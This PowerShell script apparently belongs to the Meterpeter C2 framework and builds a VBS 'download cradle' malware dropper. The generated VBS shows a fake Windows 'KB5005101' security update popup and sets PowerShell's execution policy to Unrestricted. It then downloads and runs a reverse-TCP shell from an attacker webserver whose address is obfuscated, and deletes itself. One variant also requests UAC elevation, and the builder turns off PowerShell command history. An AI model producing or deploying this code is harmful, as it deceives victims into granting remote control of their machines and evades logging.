<#
.SYNOPSIS
   Cmdlet to create Download_Crandle.vbs

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: none
   Optional Dependencies: @Meterpeter C2 v2.10.11
   PS cmdlet Dev version: v1.0.3

.DESCRIPTION
   Cmdlet to create download_crandle.vbs that allow @Meterpeter C2 v2.10.11
   users to create VBS download crandles to download\execute rev tcp shells.

.NOTES
   This cmdlet its a auxiliary module of @Meterpeter C2 v2.10.11 release.
   If invoked -UACElevation 'true' then cmdlet creates Download_crandle.vbs
   with UAC elevation function, If invoked -UACElevation 'false' then cmdlet
   creates Download_crandle.vbs without UAC elevation function technic.

   Remark: The vbs scripts created by this cmdlet requires @Meterpeter
   C2 v2.10.11 framework to continue building the downloader crandle.

.Parameter UACElevation
   Accepts arguments: true, false (default: false)

.Parameter VbsName
   The VBS crandle name (default: Download_Crandle.vbs) 

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -UACElevation 'true'
   creates 'Download_crandle.vbs' with UAC elevation function

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -UACElevation 'false'
   creates 'Download_crandle.vbs' without the UAC elevation function

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -UACElevation 'false' -vbsname "MineDownloader.vbs"
   creates 'MineDownloader.vbs' without the UAC elevation function technic

.INPUTS
   None. You cannot pipe objects into crandle_builder.ps1

.OUTPUTS
  none
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$VbsName="Download_Crandle.vbs",
   [string]$UACElevation="false"
)


#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null


$UserLand = @("' Author: @r00t-3xp10it (ssa)
' Application: meterpeter v2.10.11 download crandle
' Description:
'   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
'   pretending to be a security KB5005101 21H1 update, while downloads\executes
'   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver
'   and it deletes itself (Download_Crandle.vbs) in the end of execution.
' ---

dIm Char,Cmd,Layback
Char=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
Layback=rEpLaCe(Char, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

set objshell = CreateObject(`"Wscript.Shell`")
CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
objShell.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
objShell.Run(`"powershell.exe cd `$Env:TMP;powershell.exe iwr -Uri http://`"+Cmd+`"/Update-KB5005101.ps1 -OutFile Update-KB5005101.ps1;powershell -File Update-KB5005101.ps1`"), 0
Set oFso = CreateObject(`"Scripting.FileSystemObject`") : oFso.DeleteFile Wscript.ScriptFullName, True
}")


$AutoElevation = @("' Author: @r00t-3xp10it (ssa)
' Application: meterpeter v2.10.11 download crandle
' Description:
'   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
'   pretending to be a security KB5005101 21H1 update, while downloads\executes
'   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver
'   and it deletes itself (Download_Crandle.vbs) in the end of execution.
' ---

'VBS-Auto-Elevation function
If WScript.Arguments.length = 0 Then
   Set objShell = CreateObject(`"Shell.Application`")
   objShell.ShellExecute `"wscript.exe`", Chr(34) & _
      WScript.ScriptFullName & Chr(34) & `" uac`", `"`", `"runas`", 1
Else
   dIm Char,Cmd,Layback
   Char=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
   Layback=rEpLaCe(Char, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

   set objshell = CreateObject(`"Wscript.Shell`")
   CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
   objShell.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
   objShell.Run(`"powershell.exe cd `$Env:TMP;powershell.exe iwr -Uri http://`"+Cmd+`"/Update-KB5005101.ps1 -OutFile Update-KB5005101.ps1;powershell -File Update-KB5005101.ps1`"), 0
   Set oFso = CreateObject(`"Scripting.FileSystemObject`") : oFso.DeleteFile Wscript.ScriptFullName, True
End If
}")


## Create VBS Download Crandle Script
# NOTE: crandle will be created on current directory
If($UACElevation -ieq "True")
{
   echo $AutoElevation|Out-File "$VbsName" -Encoding string -Force
}
ElseIf($UACElevation -ieq "False")
{
   echo $UserLand|Out-File "$VbsName" -Encoding string -Force
}
Else
{
   Write-Host "[error] -UACElevation 'true|false' missing parameter .."
}